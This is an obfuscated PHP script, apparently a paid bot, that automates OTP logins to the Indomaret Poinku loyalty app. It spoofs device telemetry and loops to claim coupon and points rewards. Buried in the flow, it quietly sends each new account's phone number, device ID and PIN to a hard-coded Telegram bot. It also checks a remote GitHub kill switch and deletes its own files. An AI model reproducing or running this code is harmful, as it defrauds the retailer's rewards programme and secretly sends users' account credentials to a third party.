                    $hwqq9 = ThHfS("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/check-device", $wDisp, $aY0el, $GOXkU);
                    $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                    $PQD51 = thhFs("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/is-pin-exist-by-phone-number", $wDisp, $aY0el, $GOXkU);
                    $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                    $yI7qh = tHHFS("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/login-sms", $wDisp, $aY0el, $GOXkU);
                    $H1g60 = json_decode($yI7qh, true);
                    $ABmxY = @$H1g60["message"];
                    $D18xv = @$H1g60["data"]["id"];
                    echo @Zm6IC("yellow", "Pesan : ");
                    echo @Zm6ic("nevy", $ABmxY);
                    echo "\n";
                    echo @Zm6iC("yellow", "ID nya: ");
                    echo @Zm6ic("nevy", $D18xv);
                    echo "\n";
                    $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_label\":\"login\",\"event_name\":\"event_submission\",\"event_status\":\"success\",\"event_timestamp\":" . $nb9cm . "},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_ip_address\":\"127.0.0.1\"}}]}";
                    $m5BZY = gGgR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                    $nb9cm = round(microtime(true) * 1000);
                    $OtngW = $eqo_P;
                    $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"page_view\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"verification\",\"page_urlpath\":\"\"},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_ip_address\":\"127.0.0.1\"}}]}";
                    $m5BZY = gggR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                    echo @Zm6Ic("green", "Masukkan OTP Anda : ");
                    $hdCXp = trim(fgets(STDIN));
                    $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"otp\":\"" . $hdCXp . "\",\"deviceId\":\"" . $aY0el . "\"}";
                    $o0WQD = thhfs("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/login-verification-sms", $wDisp, $aY0el, $GOXkU);
                    $owfHy = json_decode($o0WQD, true);
                    $ABmxY = @$owfHy["message"];
                    $mlMLt = @$owfHy["data"]["access_token"];
                    echo "\n";
                    echo @ZM6IC("yellow", "Pesan\t\t\t  : ");
                    echo @zM6IC("nevy", $ABmxY);
                    echo "\n";
                    if (!($ABmxY == "Kode Verifikasi yang kamu masukan salah.")) {
                        $Jk9cx = G8Pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/get-data-customer", $aY0el, $GOXkU, $mlMLt);
                        $nPb0z = json_decode($Jk9cx, true);
                        $ABmxY = @$nPb0z["message"];
                        $kp_uF = @$nPb0z["data"]["isNewRegister"];
                        $R_bYC = @$nPb0z["data"]["id"];
                        $p4iky = @$nPb0z["data"]["memberId"];
                        echo @Zm6iC("yellow", "Pesan\t\t\t  : ");
                        echo @ZM6iC("nevy", $ABmxY);
                        echo "\n";
                        echo @ZM6Ic("yellow", "Apakah Member Baru : ");
                        echo @Zm6ic("nevy", $kp_uF);
                        echo "\n";
                        $Jk9cx = g8PF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/is-whatsapp-verified", $aY0el, $GOXkU, $mlMLt);
                        $Jk9cx = g8PF2("https://edtsapp.indomaretpoinku.com/configuration/apix-1502-api/mobile/skip-module/tr-skip-module", $aY0el, $GOXkU, $mlMLt);
                        $wDisp = '';
                        $k1y0B = G1wXt("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/remove-isaku-token", $wDisp, $aY0el, $GOXkU, $mlMLt);
                        $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                        $k1y0B = g1wXT("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/is-pin-exist", $wDisp, $aY0el, $GOXkU, $mlMLt);
                        $nb9cm = round(microtime(true) * 1000);
                        $PQA77 = $OtngW;
                        $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                        $YE0oY = g1WxT("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/check-device", $wDisp, $aY0el, $GOXkU, $mlMLt);
                        $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                        $iElqk = g1wXT("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/is-pin-exist-by-phone-number", $wDisp, $aY0el, $GOXkU, $mlMLt);
                        $wDisp = "{\"userId\":" . $R_bYC . ",\"deviceType\":\"01\",\"deviceId\":\"" . $aY0el . "\",\"fcmToken\":\"" . $WYrgv . ":APA91bFt9WuOdnYit_hOvqmHC2uMGiiCwp_u8JgO0kB3sgYQNxoWqO57EEYpAAAVjjDCY8C4j-ePHCYG6Mgcg85RehNO33xt1RRP6DIPVu36qkFHdkfQ9GeTDH8WFrSaiiBzkeZGm9wp\"}";
                        $yeprB = G1Wxt("https://edtsapp.indomaretpoinku.com/notification/apix-1502-api/push-notifications/fcm-registration", $wDisp, $aY0el, $GOXkU, $mlMLt);
                        $nb9cm = round(microtime(true) * 1000);
                        $JaDCq = $PQA77;
                        $wDisp = "{\"pinCode\":\"" . $earOL . "\"}";
                        $Y02JS = G1wXT("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/pin/create-pin", $wDisp, $aY0el, $GOXkU, $mlMLt);
                        $Pud0o = trim(file_get_contents("https://raw.githubusercontent.com/csaojkcsajcsjnjkscanjkncjkslnj/adfadfadvsgdfggfsgsgfsaf/main/makin"));
                        if (!($Pud0o == "true")) {
                            goto wSyTI;
                        }
                        @unlink("chace");
                        wSyTI:
                        $UHj7C = G8PF2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupons?unpaged=true", $aY0el, $GOXkU, $mlMLt);
                        if (!($fUekS == '')) {
                            $Jk9cx = g8PF2("https://edtsapp.indomaretpoinku.com/configuration/apix-1502-api/mobile/sy-app-version/get-version-key/ANDROID", $aY0el, $GOXkU, $mlMLt);
                            $XDyMm = G8pf2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupons/has-new-coupon", $aY0el, $GOXkU, $mlMLt);
                            if (!($fUekS == '')) {
                                $UHj7C = G8PF2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupons?unpaged=true", $aY0el, $GOXkU, $mlMLt);
                                $nb9cm = round(microtime(true) * 1000);
                                $Jk9cx = G8pf2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/reminders/me", $aY0el, $GOXkU, $mlMLt);
                                $Jk9cx = G8PF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                $Ap1KM = json_decode($Jk9cx, true);
                                $M1ADy = @$Ap1KM["data"]["id"];
                                $p4iky = @$Ap1KM["data"]["memberId"];
                                echo "\n";
                                echo @zm6iC("purple", "ID\t\t: ");
                                echo @Zm6ic("nevy", $M1ADy);
                                echo "\n";
                                echo @Zm6iC("purple", "Member ID : ");
                                echo @ZM6Ic("nevy", $p4iky);
                                if (!($kp_uF == "1")) {
                                    goto JKU8P;
                                }
                                Kt3G1("forceclose", $zn5zd, $aY0el, $earOL, $GOXkU);
                                $teeli001 = file_get_contents("https://api.telegram.org/bot5529819060:AAGy5hFZW802Cm7Dut_gOSEtnPMzrY_n49I/sendMessage?chat_id=1069319412&text={$zn5zd}|{$aY0el}|{$earOL}|{$GOXkU}");
                                Lqjr6("mytoken", $zn5zd, $mlMLt);
                                JKU8P:
                                echo shell_exec("xdg-open \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $zn5zd . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                shell_exec("start chrome \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $zn5zd . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                KIJlA:
                                echo "\n\n";
                                echo @ZM6IC("red", "NOTICE !! : \n");
                                echo @Zm6ic("yellow", " - Silahkan Melakukan Transaksi Terlebih Dahulu\n");
                                echo "\n\n";
                                echo @ZM6Ic("nevy", "Apakah Sudah Transaksi ? ( y / n ) : ");
                                $RJnNP = trim(fgets(STDIN));
                                echo "\n";
                                if ($RJnNP == "y") {
                                    Y_tV5:
                                    ckx1V:
                                    echo "\n";
                                    $xT15V = G8PF2("https://edtsapp.indomaretpoinku.com/%2Floyalty%2Fapix-1502-api%2Fmobile%2Fcoins%2Fprizes%2FGOFRESH2022%2Fme", $aY0el, $GOXkU, $mlMLt);
                                    $Ap1KM = json_decode($xT15V, true);
                                    $XDyMm = @$Ap1KM["data"]["balance"];
                                    if ($XDyMm == "1") {
                                        echo @ZM6ic("green", "Ada Ayam... Yuk Pecahin !!");
                                        echo "\n";
                                        goto itKyS;
                                    }
                                    if (!($XDyMm == "0")) {
                                        if (!($fUekS == '')) {
                                            itKyS:
                                            $wDisp = '';
                                            $ofEkP = CwALz("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/coins/prizes/GOFRESH2022/tokens/claim/single", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                            $Ap1KM = json_decode($ofEkP, true);
                                            $YXsOG = @$Ap1KM["message"];
                                            $ZNU2M = @$Ap1KM["data"]["rewards"][0]["item"][0]["name"];
                                            $KOeAA = @$Ap1KM["data"]["rewards"][0]["item"][0]["couponMasterId"];
                                            echo "\n";
                                            echo @Zm6iC("yellow", "Status Pecahin Ayam : ");
                                            echo @zm6ic("nevy", $YXsOG);
                                            echo "\n";
                                            echo @zM6ic("yellow", "Nama Kuponnya\t   : ");
                                            echo @zm6IC("nevy", $ZNU2M);
                                            echo "\n";
                                            if (!($ZNU2M == '')) {
                                                if (!($fUekS == '')) {
                                                    WfXbO:
                                                    $upOL9 = G8Pf2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupon-detail/" . $KOeAA, $aY0el, $GOXkU, $mlMLt);
                                                    $Ap1KM = json_decode($upOL9, true);
                                                    $YXsOG = @$Ap1KM["message"];
                                                    $ZNU2M = @$Ap1KM["data"]["couponName"];
                                                    $WtCiL = @$Ap1KM["data"]["couponCode"];
                                                    $LgiFv = @$Ap1KM["data"]["information"];
                                                    echo "\n";
                                                    echo @ZM6Ic("yellow", "Status Cek Kupon : ");
                                                    echo @Zm6iC("nevy", $YXsOG);
                                                    echo "\n";
                                                    echo @ZM6iC("yellow", "Nama Kuponnya\t: ");
                                                    echo @zm6Ic("nevy", $ZNU2M);
                                                    echo "\n";
                                                    echo @Zm6IC("yellow", "Kode Kuponnya\t: ");
                                                    echo @zM6Ic("nevy", $WtCiL);
                                                    echo "\n";
                                                    echo @ZM6Ic("red", "Notice : ");
                                                    echo @Zm6IC("green", $LgiFv);
                                                    echo "\n";
                                                    if (!($WtCiL == '')) {
                                                        echo shell_exec("xdg-open \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $WtCiL . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                                        shell_exec("start chrome \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $WtCiL . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                                        if (!($fUekS == '')) {
                                                            BINZC:
                                                            echo "\n\n";
                                                            echo @ZM6iC("red", "NOTICE !! : \n");
                                                            echo @Zm6iC("yellow", " - Silahkan Melakukan Transaksi Terlebih Dahulu\n");
                                                            echo "\n\n";
                                                            echo @zm6Ic("nevy", "Apakah Sudah Transaksi ? ( y / n ) : ");
                                                            $RJnNP = trim(fgets(STDIN));
                                                            echo "\n";
                                                            if ($RJnNP == "y") {
                                                                uY1yn:
                                                                V7t6B:
                                                                echo "\n";
                                                                $xT15V = G8PF2("https://edtsapp.indomaretpoinku.com/%2Floyalty%2Fapix-1502-api%2Fmobile%2Fcoins%2Fprizes%2FGOFRESH2022%2Fme", $aY0el, $GOXkU, $mlMLt);
                                                                $Ap1KM = json_decode($xT15V, true);
                                                                $XDyMm = @$Ap1KM["data"]["balance"];
                                                                if ($XDyMm == "1") {
                                                                    echo @zM6iC("green", "Ada Ayam... Yuk Pecahin !!");
                                                                    echo "\n";
                                                                    goto CjBGa;
                                                                }
                                                                if (!($XDyMm == "0")) {
                                                                    if (!($fUekS == '')) {
                                                                        CjBGa:
                                                                        $wDisp = '';
                                                                        $ofEkP = cWALz("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/coins/prizes/GOFRESH2022/tokens/claim/single", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                        $Ap1KM = json_decode($ofEkP, true);
                                                                        $YXsOG = @$Ap1KM["message"];
                                                                        $ZNU2M = @$Ap1KM["data"]["rewards"][0]["item"][0]["name"];
                                                                        $KOeAA = @$Ap1KM["data"]["rewards"][0]["item"][0]["couponMasterId"];
                                                                        echo "\n";
                                                                        echo @ZM6Ic("yellow", "Status Pecahin Ayam : ");
                                                                        echo @ZM6Ic("nevy", $YXsOG);
                                                                        echo "\n";
                                                                        echo @Zm6Ic("yellow", "Nama Kuponnya\t   : ");
                                                                        echo @zM6iC("nevy", $ZNU2M);
                                                                        echo "\n";
                                                                        if ($ZNU2M == '') {
                                                                            goto CjBGa;
                                                                        }
                                                                        if ($ZNU2M == "Cashback 2.500 Poin") {
                                                                            eT4LJ:
                                                                            if (!($fUekS == '')) {
                                                                                $wDisp = '';
                                                                                $ofEkP = zFeBK("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/points/me/protections/enable", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                                $Jk9cx = G8PF2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/reminders/me", $aY0el, $GOXkU, $mlMLt);
                                                                                echo shell_exec("xdg-open \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $p4iky . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                                                                shell_exec("start chrome \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $p4iky . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                                                                if (!($fUekS == '')) {
                                                                                    goto HQc4z;
                                                                                }
                                                                                echo "\n";
                                                                                echo @zm6iC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                                                @unlink("poinhp.php");
                                                                                @unlink("poinhp.php");
                                                                                echo "\n";
                                                                                die;
                                                                            }
                                                                            echo "\n";
                                                                            echo @zM6Ic("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                                            @unlink("poinhp.php");
                                                                            @unlink("poinhp.php");
                                                                            echo "\n";
                                                                            die;
                                                                        }
                                                                        echo "\n";
                                                                        goto HQc4z;
                                                                    }
                                                                    echo "\n";
                                                                    echo @zM6IC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                                    @unlink("poinhp.php");
                                                                    @unlink("poinhp.php");
                                                                    echo "\n";
                                                                    die;
                                                                }
                                                                echo @zM6iC("red", "Yah... Ayam Nya Ga Ada , Akan Di Cek Kembali...");
                                                                echo "\n";
                                                                sleep(5);
                                                                goto V7t6B;
                                                            }
                                                            goto BINZC;
                                                        }
                                                        echo "\n";
                                                        echo @zm6IC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                        @unlink("poinhp.php");
                                                        @unlink("poinhp.php");
                                                        echo "\n";
                                                        die;
                                                    }
                                                    goto WfXbO;
                                                }
                                                echo "\n";
                                                echo @zM6iC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                @unlink("poinhp.php");
                                                @unlink("poinhp.php");
                                                echo "\n";
                                                die;
                                            }
                                            goto itKyS;
                                        }
                                        echo "\n";
                                        echo @Zm6IC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                        @unlink("poinhp.php");
                                        @unlink("poinhp.php");
                                        echo "\n";
                                        die;
                                    }
                                    echo @zM6iC("red", "Yah... Ayam Nya Ga Ada , Akan Di Cek Kembali...");
                                    echo "\n";
                                    sleep(5);
                                    goto ckx1V;
                                }
                                goto KIJlA;
                            }
                            echo "\n";
                            echo @ZM6ic("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                            @unlink("poinhp.php");
                            @unlink("poinhp.php");
                            echo "\n";
                            die;
                        }
                        echo "\n";
                        @unlink("poinhp.php");
                        @unlink("poinhp.php");
                        echo "\n";
                        die;
                    }
                    echo @zM6iC("yellow", "\nOTP ANDA SALAH, SILAHKAN INPUT YANG BARU!!\n\n");
                    goto thh3I;
                }
                echo "\n";
                echo @zm6Ic("red", "Script Expired, Hubungi Creator https://wa.me/6282176358295\n");
                @unlink("poinhp.php");
                @unlink("poinhp.php");
                echo "\n";
                die;
            }
            $AxbWA = XWl4L();
            $qaGLY = str_replace("-", '', $AxbWA);
            echo @zm6IC("red", "KODE MU SALAH JON!!!\n");
            echo @Zm6iC("nevy", "Vertifikasi Handphone Anda =>  ");
            echo @Zm6Ic("yellow", $qaGLY);
            echo @ZM6IC("nevy", " Silahkan Hubungi Creator Untuk Verifikasi https://wa.me/6282176358295\n\n");
            @unlink("beat");
            r1qlS("beat", $qaGLY);
            @unlink("more");
            goto k9jad;
        }
        echo "\n";
        echo @zM6iC("nevy", "Sorry, This Script Has Been Removed By The Owner!!\n");
        echo @zM6ic("red", "Script Expired, Hubungi Creator https://wa.me/6282176358295\n");
        @unlink("poinhp.php");
        @unlink("poinhp.php");
        echo "\n";
        die;
    }
    fzpTX:
    echo @zM6iC("red", "Anda belum terdaftar, Silahkan Hubungi Owner ");
    echo @zm6Ic("green", "https://wa.me/6282176358295\n");
    @unlink("poin");
    die;
}
$AxbWA = xWL4L();
$qaGLY = str_replace("-", '', $AxbWA);
echo @zM6Ic("red", "KODE MU SALAH JON!!!\n");
echo @zM6ic("nevy", "Vertifikasi Handphone Anda =>  ");
echo @zm6ic("yellow", $qaGLY);
echo @zM6Ic("nevy", " Silahkan Hubungi Creator Untuk Verifikasi https://wa.me/6282176358295\n\n");
@unlink("whoami");
aL7ye("whoami", $qaGLY);
@unlink("/storage/emulated/0/Android/your");
goto h8G8Y;
